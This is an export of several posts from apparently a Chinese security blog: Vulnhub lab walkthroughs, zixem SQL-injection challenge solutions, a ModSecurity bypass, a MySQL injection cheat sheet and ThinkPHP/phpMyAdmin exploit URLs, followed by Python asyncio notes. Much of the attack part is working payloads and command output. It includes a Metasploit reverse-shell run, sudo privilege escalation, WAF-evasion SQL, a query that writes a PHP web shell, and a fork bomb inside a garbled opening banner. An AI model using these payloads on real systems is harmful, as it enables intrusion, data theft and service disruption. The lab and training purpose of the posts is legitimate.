/shMTl#beats3o.No.: :Ring0: `dDestRoyREXKC3ta/M: :23d: sSETEC.ASTRONOMYist: /- /yo- .ence.N:()&#123; :|: &amp; &#125;;: `:Shall.We.Play.A.Game?tron/ ```-ooy.if1ghtf0r+ehUser5` ..th3.H1V3.U2VjRFNN.jMh+.` `MjM~~WE.ARE.se~~MMjMs +~KANSAS.CITY&#x27;s~-` J~HAKCERS~./.` .esc:wq!:` +++ATH` ` =[ metasploit v6.0.30-dev ]+ -- --=[ 2099 exploits - 1129 auxiliary - 357 post ]+ -- --=[ 592 payloads - 45 encoders - 10 nops ]+ -- --=[ 7 evasion ]Metasploit tip: When in a module, use back to go back to the top level promptmsf6 &gt; search DrupalMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/drupal_openid_xxe 2012-10-17 normal Yes Drupal OpenID External Entity Injection 1 auxiliary/scanner/http/drupal_views_user_enum 2010-07-02 normal Yes Drupal Views Module Users Enumeration 2 exploit/multi/http/drupal_drupageddon 2014-10-15 excellent No Drupal HTTP Parameter Key/Value SQL Injection 3 exploit/unix/webapp/drupal_coder_exec 2016-07-13 excellent Yes Drupal CODER Module Remote Command Execution 4 exploit/unix/webapp/drupal_drupalgeddon2 2018-03-28 excellent Yes Drupal Drupalgeddon 2 Forms API Property Injection 5 exploit/unix/webapp/drupal_restws_exec 2016-07-13 excellent Yes Drupal RESTWS Module Remote PHP Code Execution 6 exploit/unix/webapp/drupal_restws_unserialize 2019-02-20 normal Yes Drupal RESTful Web Services unserialize() RCE 7 exploit/unix/webapp/php_xmlrpc_eval 2005-06-29 excellent Yes PHP XML-RPC Arbitrary Code ExecutionInteract with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_evalmsf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.109.145rhosts =&gt; 192.168.109.145msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 9001rport =&gt; 9001msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit [*] Started reverse TCP handler on 192.168.109.140:4444 [*] Executing automatic check (disable AutoCheck to override)[+] The target is vulnerable.[*] Sending stage (39282 bytes) to 192.168.109.145[*] Meterpreter session 1 opened (192.168.109.140:4444 -&gt; 192.168.109.145:45078) at 2021-07-27 13:18:40 -0400 利用成功，这里可在misc目录下找到应该存放用户名密码的文件（tyrell.pass），此处也参考了网络上的文章，应该在翻文件时不仔细。。。 读取密码文件 123cat tyrell.passUsername: tyrellPassword: mR_R0bo7_i5_R3@!_ 得到用户名密码后可使用ssh进行连接连接成功后需要提权，此处提权依然使用sudo进行提权 提权 123456sudo -lMatching Defaults entries for tyrell on vuln_cms: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser tyrell may run the following commands on vuln_cms: (root) NOPASSWD: /bin/journalctl 可以看到journalctl运行时不需要验证密码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849sudo journalctl -- Logs begin at Fri 2021-05-28 12:16:41 UTC, end at Tue 2021-07-27 17:31:18 UTC. --May 28 12:16:41 vuln_cms kernel: Linux version 4.15.0-143-generic (buildd@lcy01-amd64-001) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #147-Ubuntu SMP Wed Apr 14 16:10:11 UTMay 28 12:16:41 vuln_cms kernel: Command line: BOOT_IMAGE=/vmlinuz-4.15.0-143-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro maybe-ubiquityMay 28 12:16:41 vuln_cms kernel: KERNEL supported cpus:May 28 12:16:41 vuln_cms kernel: Intel GenuineIntelMay 28 12:16:41 vuln_cms kernel: AMD AuthenticAMDMay 28 12:16:41 vuln_cms kernel: Centaur CentaurHaulsMay 28 12:16:41 vuln_cms kernel: [Firmware Bug]: TSC doesn&#x27;t count with P0 frequency!May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x001: &#x27;x87 floating point registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x002: &#x27;SSE registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: Supporting XSAVE feature 0x004: &#x27;AVX registers&#x27;May 28 12:16:41 vuln_cms kernel: x86/fpu: xstate_offset[2]: 576, xstate_sizes[2]: 256May 28 12:16:41 vuln_cms kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using &#x27;standard&#x27; format.May 28 12:16:41 vuln_cms kernel: e820: BIOS-provided physical RAM map:May 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usableMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x0000000000100000-0x000000007ffeffff] usableMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x000000007fff0000-0x000000007fffffff] ACPI dataMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reservedMay 28 12:16:41 vuln_cms kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reservedMay 28 12:16:41 vuln_cms kernel: NX (Execute Disable) protection: activeMay 28 12:16:41 vuln_cms kernel: SMBIOS 2.5 present.May 28 12:16:41 vuln_cms kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006May 28 12:16:41 vuln_cms kernel: Hypervisor detected: KVMMay 28 12:16:41 vuln_cms kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; reservedMay 28 12:16:41 vuln_cms kernel: e820: remove [mem 0x000a0000-0x000fffff] usableMay 28 12:16:41 vuln_cms kernel: e820: last_pfn = 0x7fff0 max_arch_pfn = 0x400000000May 28 12:16:41 vuln_cms kernel: MTRR default type: uncachableMay 28 12:16:41 vuln_cms kernel: MTRR variable ranges disabled:May 28 12:16:41 vuln_cms kernel: MTRR: DisabledMay 28 12:16:41 vuln_cms kernel: x86/PAT: MTRRs disabled, skipping PAT initialization too.May 28 12:16:41 vuln_cms kernel: CPU MTRRs all blank - virtualized system.May 28 12:16:41 vuln_cms kernel: x86/PAT: Configuration [0-7]: WB WT UC- UC WB WT UC- UC May 28 12:16:41 vuln_cms kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff]May 28 12:16:41 vuln_cms kernel: Scanning 1 areas for low memory corruptionMay 28 12:16:41 vuln_cms kernel: RAMDISK: [mem 0x30ec5000-0x34759fff]May 28 12:16:41 vuln_cms kernel: ACPI: Early table checksum verification disabledMay 28 12:16:41 vuln_cms kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX )May 28 12:16:41 vuln_cms kernel: ACPI: XSDT 0x000000007FFF0030 00003C (v01 VBOX VBOXXSDT 00000001 ASL 00000061)May 28 12:16:41 vuln_cms kernel: ACPI: FACP 0x000000007FFF00F0 0000F4 (v04 VBOX VBOXFACP 00000001 ASL 00000061)May 28 12:16:41 vuln_cms kernel: ACPI: DSDT 0x000000007FFF0470 002325 (v02 VBOX VBOXBIOS 00000002 INTL 20100528)May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040May 28 12:16:41 vuln_cms kernel: ACPI: FACS 0x000000007FFF0200 000040!/bin/sh# iduid=0(root) gid=0(root) groups=0(root) 程序运行后，输入!/bin/sh可提升至root权限读取flag 123456789101112# cd /home/ # lselliot ghost tyrell# cd elliot# cat user.txt9046628504775551# cd /root/# lsroot.txt# cat root.txt4359537020406305# done","categories":[],"tags":[],"author":"Dokey_"},{"title":"Vulnhub-Hackathon2","slug":"Vulnhub-Hackathon2","date":"2021-07-24T06:06:59.000Z","updated":"2023-03-25T14:35:06.442Z","comments":true,"path":"16564.html","link":"","permalink":"http://example.com/16564.html","excerpt":"","text":"记录打靶机（Hackathon2）的过程信息探测主机发现这里使用的是arp-scan进行扫描，因为在使用netdiscover无法成功探测到网段下存活主机，不知道是不是命令使用不正确，后续研究一下。。。 123456789101112sudo arp-scan 192.168.109.1/24 Interface: eth0, type: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140WARNING: host part of 192.168.109.1/24 is non-zeroStarting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.109.1 00:50:56:c0:00:08 VMware, Inc.192.168.109.2 00:50:56:f0:a1:15 VMware, Inc.192.168.109.144 00:0c:29:28:21:61 VMware, Inc.192.168.109.254 00:50:56:f2:84:70 VMware, Inc.4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 1.934 seconds (132.37 hosts/sec). 4 responded 经arp-scan探测后发现存在192.168.109.144这个IP地址，对此IP地址进行端口扫描，一般会存在80端口 端口扫描 1234567891011121314151617181920212223242526272829303132333435363738nmap -sC -sV -p- 192.168.109.144 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 23:33 EDTNmap scan report for 192.168.109.144Host is up (0.00020s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 1000 1000 47 Jun 18 17:32 flag1.txt|_-rw-r--r-- 1 1000 1000 849 Jun 19 05:11 word.dir| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.109.140| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_*/|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: hackathon27223/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 70:4a:a9:69:c2:d1:68:23:86:bd:85:83:31:ca:80:0c (RSA)| 256 a6:9e:a4:18:ad:a4:2b:7e:ea:f8:5e:63:29:6e:4f:24 (ECDSA)|_ 256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.09 seconds nmap扫描后发现存在21（ftp）、80（Apache-httpd）、7223（ssh）三个端口，针对这三个端口有必要进行以下信息收集： ftp（21）端口： 尝试匿名用户登录（anonymous&#x2F;anonymous）✔ 在漏洞数据库搜索相关ftp（vsftpd 3.0.3）版本漏洞 ✗ http（80）端口： 可进行目录扫描，爆破出隐藏的目录以及页面 ✔ 查看已发现页面的源码，对index.html源码进行查看，无有用信息，因为是靶机，通常页面或者隐藏页面中源码会有一些有用的信息 ✔ ssh（7223）端口 在漏洞数据库搜索相关ssh（OpenSSH 8.2p1）版本漏洞 ✗ 使用hydra进行爆破，此处需收集用户名、密码 ✔ 使用anonymous&#x2F;anonymous登录ftp 12345678910111213141516ftp&gt; open 192.168.109.144Connected to 192.168.109.144.220 (vsFTPd 3.0.3)Name (192.168.109.144:kali): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 1000 1000 47 Jun 18 17:32 flag1.txt-rw-r--r-- 1 1000 1000 849 Jun 19 05:11 word.dir226 Directory send OK.ftp&gt; 匿名登录成功后可以看到flag1.txt和word.dir两个文件，猜测word.dir为一个字典文件，看了内容大概率是一个密码字典文件，如果使用其来爆破ssh用户名密码的话，此处还需要用户名， 因为本次靶机使用的ssh版本不存在用户名枚举漏洞，故猜测在80端口页面上可能存在用户名。 进行目录扫描这里有点问题：在使用dirb进行目录扫描时会发现除了几个通用的页面之外无其他有用信息Tips：可以使用word.dic为字典文件进行目录扫描 123456789101112131415161718192021dirb http://192.168.109.144/ word.dir -----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Sat Jul 24 01:52:28 2021URL_BASE: http://192.168.109.144/WORDLIST_FILES: word.dir-----------------GENERATED WORDS: 109 ---- Scanning URL: http://192.168.109.144/ ----+ http://192.168.109.144/happy (CODE:200|SIZE:110) -----------------END_TIME: Sat Jul 24 01:52:28 2021DOWNLOADED: 109 - FOUND: 1 经扫描后发现存在happy页面，访问后在源码上可发现暴露了一个用户名 爆破ssh整理一下信息，现在在80端口下的happy页面发现用户名，在ftp上发现word.dic字典文件，可以尝试爆破ssh，进一步获取权限 12345678910111213hydra -l hackathonll -P word.dir -f -t 20 ssh://192.168.109.144 -s 7223 Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-24 00:16:41[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 20 tasks per 1 server, overall 20 tasks, 110 login tries (l:1/p:110), ~6 tries per task[DATA] attacking ssh://192.168.109.144:7223/[7223][ssh] host: 192.168.109.144 login: hackathonll password: Ti@gO[STATUS] attack finished for 192.168.109.144 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-24 00:16:58 hydra已经爆破出密码：Ti@gO 连接ssh使用已爆破的用户名、密码进行ssh连接至靶机 1234567891011121314151617181920212223242526272829ssh hackathonll@192.168.109.144 -p 7223 hackathonll@192.168.109.144&#x27;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 24 Jul 2021 07:38:22 AM UTC System load: 0.01 Processes: 221 Usage of /: 24.2% of 18.57GB Users logged in: 0 Memory usage: 20% IPv4 address for ens33: 192.168.109.144 Swap usage: 0%67 updates can be installed immediately.0 of these updates are security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Sat Jul 24 04:18:07 2021 from 192.168.109.140$ iduid=1001(hackathonll) gid=1001(hackathonll) groups=1001(hackathonll)$ 连接成功，但是此时的用户为hackathonll，因此需要进行提权 提权使用sudo -l查看是否可使用sudo进行提权，发现vim可以不验证密码具备root权限 12345678sudo -lMatching Defaults entries for hackathonll on hackathon: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hackathonll may run the following commands on hackathon: (root) NOPASSWD: /usr/bin/vim 上网查过后发现可直接使用vim进行提权，进入vim编辑界面时输入!bash可直接获取root权限可参考：https://blog.csdn.net/qq_39991837/article/details/118119954 1234567891011sudo vimroot@hackathon:/home/hackathonll# iduid=0(root) gid=0(root) groups=0(root)root@hackathon:/home/hackathonll# lsroot@hackathon:/home/hackathonll# cdroot@hackathon:~# lsflag2.txt snaproot@hackathon:~# cat flag2.txt ₣Ⱡ₳₲&#123;7e3c118631b68d159d9399bda66fc694&#125;root@hackathon:~# 至此，Hackathon2靶机渗透完成。。。done","categories":[],"tags":[],"author":"Dokey_"},{"title":"zixem SQL challenges","slug":"zixem-challenges","date":"2021-07-22T08:43:09.000Z","updated":"2023-03-25T14:35:06.472Z","comments":true,"path":"19459.html","link":"","permalink":"http://example.com/19459.html","excerpt":"","text":"Level 1简单的一关，常规的联合查询注入(数字型)。 ?id=1 and 1=2 union select 1,concat(user(),version),3--+ Level 2同Level 1简单，字符型注入，闭合单引号即可。 ?showprofile=4&#39; and 1=2 union select 1,user(),version(),4--+ Level 3常规字符型注入，使用--+闭合单引号号即可，在使用union进行注入时，union会变成uni，此时需要使用unionon。 ?item=3&#39; and 1=2 unionon select 1,user(),version(),4--+ Level 4同Level 3，字符型注入，闭合单引号，注入语句无法使用-使其报错，可使用and 1=2。 ?ebookid=7&#39; and 1=2 union select 1,2,user(),version(),5--+ Level 5需要爆破，待… Level 6 and 1=2 union select (select id from teachers limit 1,1),(select teacher from teachers limit 1,1),(select teacher_age from teachers limit 1,1),(select price from teachers limit 1,1)-- Level 7这一关有点意思，注入好久没发现问题在哪，网上搜索后发现数据提交之后页面源代码中有个隐藏的value。 图中value的值就是注入点，后面都是常规注入操作 ?id=1 AND 1=2 UNION SELECT 1,user(),3--+ Level 8这一关会对%20进行过滤（初步判断）以及会对select进行检测，双写可绕过，数字型注入，可使用%09、%0d进行绕过，后面就是常规的注入操作。 ?id=1%09and%091=2%09union%09seselectlect%09user(),version(),3--%09- Level 9这一关需要读取/etc/passwd文件，经测试知道load_file()被禁止。不过在插入SQL注入语句(字符型注入)时会报以下错误： 根据报错提示可以在1处进行读取 ?id=1&#39; and 1=2 union select &#39;../etc/passwd&#39;,2-- - Level 10这一关x为注入点，但是参数是经过编码的，刚开始以为是base64 encode + url encode,解码后发现并没有那么简单，经过看别人的blog后了解到是uuencode，解码后参数显示为1。将SQL注入语句经过编码后可正常执行。 将SQL注入语句编码后即可 1234567891011121 and 1=2 union select 1,concat(user(),version())-- -经过uuencode加密后得到M,2!A;F0@,3TR(&#x27;5N:6]N(&#x27;-E;&amp;5C=&quot;`Q+&amp;-O;F-A=&quot;AU&lt;V5R*&quot;DL=F5R&lt;VEO(;B@I*2TM(&quot;T``再使用base64进行编码得到TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA=最后使用url编码得到最终payloadTSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA%3D done 参考链接 https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4","categories":[],"tags":[],"author":"Dokey_"},{"title":"Bypass Mod_Security","slug":"Bypass-Mod-Security","date":"2021-07-21T07:45:17.000Z","updated":"2023-03-25T14:35:06.415Z","comments":true,"path":"14163.html","link":"","permalink":"http://example.com/14163.html","excerpt":"","text":"记bypass Mod_Security起因Google上搜索相关SQL注入，在测试中发现使用联合查询注入时会报错 `Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.`， 使用order by 猜解显示位时不会报错 经过懒得fuzz，直接Google搜索了相关bypass文章，文章中详细介绍了fuzz过程，直接修改payload 进行注入。 结果结果当然是ok的了，成功注出数据库名和版本信息，后面操作大同小异，溜溜球！ payload 1/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2,3,4,5,6,7)--+ done 参考链接：https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad","categories":[],"tags":[],"author":"Dokey_"},{"title":"MYSQL备忘录","slug":"SQL备忘录","date":"2021-07-21T02:30:26.000Z","updated":"2023-03-25T14:35:06.435Z","comments":true,"path":"22293.html","link":"","permalink":"http://example.com/22293.html","excerpt":"","text":"列出可用的数据库 SHOW DATABASE; 切换到数据库 USE table_name 表 添加新表 CREATE TABLE logins (id INT, ...) 列出当前数据库中的可用表 SHOW TABLES; 显示表属性和列 DESCRIBE logins 将值添加到表 INSERT INTO table_name VALUES (value_1,...) 将值添加到表中的特定列 INSERT INTO table_name(colums2,...) VALUES(column2_value, ...) 更新表值 UPDATE table_name SET column1=newvalue1,...WHERE &lt;CONDITION&gt; 列 显示表格中的所有列 SELECT * FROM table_name 显示表格中的特定列 SELECT column1, column2 FROM table_name 删除表 DROP TABLE logins 添加新列 ALTER TABLE logins ADD newColumn INT 重命名列 ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn 更改列数据类型 ALTER TABLE logins MODIFY oldColumn DATE 删除列 ALTER TABLE logins DROP oldColumn 输出 按列排序 SELECT * FROM logins ORDER BY column_1 按列降序排序 SELECT * FROM logins ORDER BY column_1 DESC 按两列排序 SELECT * FROM logins ORDER BY column_1 DESC, id ASC 只显示前两个结果 SELECT * FROM logins LIMIT 2 只显示从索引2开始的前两个结果 SELECT * FROM logins LIMIT 1,2 列出满足条件的结果 SELECT * FROM table_name WHERE &lt;condition&gt; 列出名称与给定字符串相似的结果 SELECT * FROM logins WHERE username LIKE &#39;admin%&#39; MySQL运算符优先级 除法(&#x2F;)、乘法（*）和模数（%） 加法（+）和减法（-） 比较（&#x3D;,&gt;,&lt;,&lt;&#x3D;,&gt;&#x3D;,!&#x3D;,LIKE） 不是（！） 与（&amp;&amp;） 或（||） Payload身份验证绕过 基本身份认证绕过 admin&#39; or &#39;1&#39;=&#39;1 带注释的基本身份验证绕过 admin&#39;)-- - union injection 使用检测列数 order by &#39; order by 1-- - 使用联合注入检测列数 cn&#39; UNION select 1,2,3-- - 基本联合注入 cn&#39; UNION select 1,@@version,3,4-- - 4列联合注入 UNION select username, 2, 3, 4 from passwords-- - 数据库枚举 带查询输出的指纹 MySQL SELECT @@version 没有输出的指纹 MySQL SELECT SLEEP(5) 当前数据库名称 cn&#39; UNION select 1,database(),2,3-- - 列出所有数据库 cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 列出特定数据库中的所有表 cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- - 列出特定表中的所有列 cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- - 从另一个数据库中的表转储数据 cn&#39; UNION select 1, username, password, 4 from dev.credentials-- - 特权 查找当前用户 cn&#39; UNION SELECT 1,user(),3,4-- - 查找用户是否具有管理员权限 cn&#39; UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=&quot;root&quot;-- - 查找是否所有用户权限 cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- - 查找可以通过 MySQL 访问的目录 cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- - 文件注入 读取本地文件 cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- - 将字符串写入本地文件 select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39; 将 web shell 写入基本 web 目录 cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -","categories":[],"tags":[],"author":"Dokey_"},{"title":"vulhub","slug":"vulhub","date":"2021-07-19T07:08:58.000Z","updated":"2023-03-25T14:35:06.467Z","comments":true,"path":"26813.html","link":"","permalink":"http://example.com/26813.html","excerpt":"","text":"vulhubThinkPHP 2.x 任意代码执行漏洞1访问http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo() Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability1234567891011POST /index.php?s=captcha HTTP/1.1Host: localhostAccept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability1http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)1http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd","categories":[],"tags":[],"author":"Dokey_"},{"title":"异步协程-02","slug":"异步协程-02","date":"2021-07-01T11:14:26.000Z","updated":"2023-03-25T14:35:06.476Z","comments":true,"path":"60636.html","link":"","permalink":"http://example.com/60636.html","excerpt":"","text":"异步编程事件循环死循环，检测代码并执行某些代码 1234567891011任务列表 = [任务1，任务2，任务3...]while True: 可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有的任务，将&quot;可执行&quot;和&quot;已完成&quot;的任务返回 for 就绪任务 in 可执行的任务列表： 执行已就绪的任务 for 已完成的任务 in 已完成的任务列表： 再任务列表中移除 已完成任务 如果任务列表中的任务都已完成，则终止循环 快速上手协程函数，定义函数为async def 函数名协程对象，执行 协程函数() 得到的协程对象 123456import asyncioasync def func(): passresult = func() 注意：执行协程函数创建协程对象，函数内部代码不会执行如果想要运行协程函数内部代码，必须要将协程对象交给事件循环来处理 1234567891011import asyncioasync def func(): print(&quot;test&quot;) result = func()loop = asyncio.get_event_loop()loop.run_until_complete(result)# asyncio.run(result ) await关键字await + 可等待对象（协程对象、Future、Task对象）-&gt; IO等待一个协程函数中可以存在多个await示例： 1234567891011121314import asyncioasync def others(): print(&quot;start&quot;) await asyncio.sleep(2) print(&quot;end&quot;) return &quot;返回值&quot;async def func(): print(&quot;执行协程函数内部代码&quot;) response = await others() print(&quot;IO请求结束， 结果为：&quot; + response)asyncio.run(func()) 输出结果 12345执行协程函数内部代码start----------停顿end IO请求结束，结果为： 返回值 task对象Tasks用于并发调度协程，通过asyncio.create_task(协程对象)的方式创建Tak对象，这样可以让协程加入事件循环中等待被调度执行。除了使用asyncio.create_task()函数以外，还可以用低层级的loop.create_task()或ensure_future()函数，不建议手动实例化Task对象。 示例1 12345678910111213141516171819202122232425import asyncioasync def func(): print(1) await asyncio.sleep(2) print(2) return &quot;返回值&quot; async def main(): print(&quot;main 开始&quot;) # 创建Task对象，将当前执行func函数任务添加到事件循环中 task1 = asyncio.create_task(func()) # 创建Task对象，将当前执行func函数任务添加到事件循环中 task2 = asyncio.create_task(func()) print(&quot;main 结束&quot;) # 当执行某协程遇到IO操作时，会自动化切换执行其他任务 # 此处的await是等待相应的协程全都执行完毕并获取结果 ret1 = await task1 ret2 = await task2 asyncio.run(main()) 输出结果 12345678main 开始main 结束11---------sleep(2秒)22返回值 返回值 示例2 12345678910111213141516171819202122import asyncioasync def func(): print(1) await asyncio.sleep(2) print(2) return &quot;返回值&quot; async def main(): print(&quot;main 开始&quot;) task_list = [ asyncio.create_task(func(), name=&quot;task1&quot;) asyncio.create_task(func(), name=&quot;task2&quot;) ] print(&quot;main 结束&quot;) done, pending = await asyncio.wait(task_list) print(done) asyncio.run(main()) 输出结果 12345678main 开始main 结束11--------sleep(2秒)22&#123;&lt;Task finished name=&#x27;task1&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;, &lt;Task finished name=&#x27;task2&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;&#125; async Future对象Task对象继承Future，Task对象内部await结果的处理基于Future对象来的 concurrent.futures.Future对象使用线程池、进程池实现异步操作时用到的对象 异步迭代器略 异步上下文管理器此种对象通过定义__aenter__()和__aexit__()方法来对async_with语句中的环境进行控制 12345678910111213141516171819202122import asyncioclass AsyncContextManager: def __init__(self): self.conn = conn async def do_something(self): # 异步操作数据库 return 666 async def __aenter__(self): # 异步连接数据库 self.conn = await asyncio.sleep(2) return self async def __aexit__(self, exc_type, exc, tb): await asyncio.sleep(2)async def func(): async with AsyncContextManager as f: result = await f.do_something() print(result) asyncio.run(func())","categories":[],"tags":[],"author":"Dokey_"},{"title":"异步协程-01","slug":"异步协程-01","date":"2021-06-30T11:13:20.000Z","updated":"2023-03-25T14:35:06.473Z","comments":true,"path":"60828.html","link":"","permalink":"http://example.com/60828.html","excerpt":"","text":"异步协程-class01 协程 asyncio模块进行异步编程 实战案例 1.协程协程不是计算机提供，程序员人为创造。协程（Coroutine），也可以被称为微线程，是一种用户态内的上下文切换的技术，简而言之，其实就是通过一个线程实现代码块相互切换执行。 实现协程的方法: greenlet, 早期模块 yield关键字 asyncio装饰器（py3.4引入） async、await关键字（py3.5）【推荐】 1.1 greenlet实现协程123456789101112131415161718from greenlet import greenletdef func1(): print(1) # 第二步：输出1 gr2.switch() # 第三步：切换到func2 print(2) # 第六步：输出2 gr2.switch() # 第七步：切换到func2 def func2(): print(3) # 第四步：输出3 gr1.switch() # 第五步：切换到func1 print(4) # 第八步：输出4 gr1 = greenlet(func1)gr2 = greenlet(func2)gr1.switch() # 第一步：切换到func1 输出结果 12341324 1.2 yield关键字1234567891011121314def func1(): yield 1 yield from func2() yield 2def func2(): yield 3 yield 4f1 = func1()for item in f1: print(item) 输出结果 12341342 1.3 async、await关键字12345678910111213141516171819import asyncioasync def func1(): print(1) await asyncio.sleep(2) print(2) async def func2(): print(3) await 